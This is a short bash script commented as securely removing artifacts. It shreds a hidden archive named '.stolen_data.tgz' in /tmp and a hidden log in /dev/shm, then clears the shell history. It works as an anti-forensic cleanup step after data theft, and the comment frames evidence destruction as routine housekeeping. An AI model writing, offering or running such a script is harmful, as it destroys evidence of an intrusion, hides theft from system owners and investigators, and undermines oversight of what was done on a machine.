#!/bin/bash
# Securely removes artifacts
shred -zu /tmp/.stolen_data.tgz
shred -zu /dev/shm/.log
history -c
